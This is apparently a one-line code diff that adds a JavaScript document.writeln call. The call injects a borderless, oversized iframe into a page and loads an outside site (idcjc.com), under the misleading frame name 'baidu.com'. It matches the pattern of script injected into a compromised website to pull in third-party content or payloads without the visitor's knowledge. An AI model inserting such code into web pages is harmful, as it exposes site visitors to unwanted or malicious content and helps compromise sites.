@@ -1,0 +1,1 @@
+document.writeln("<iframe frameborder=0 scrolling=no  name=baidu.com align=center width=990 height=9250 src=http://www.idcjc.com/idcsm/><\/iframe> ")
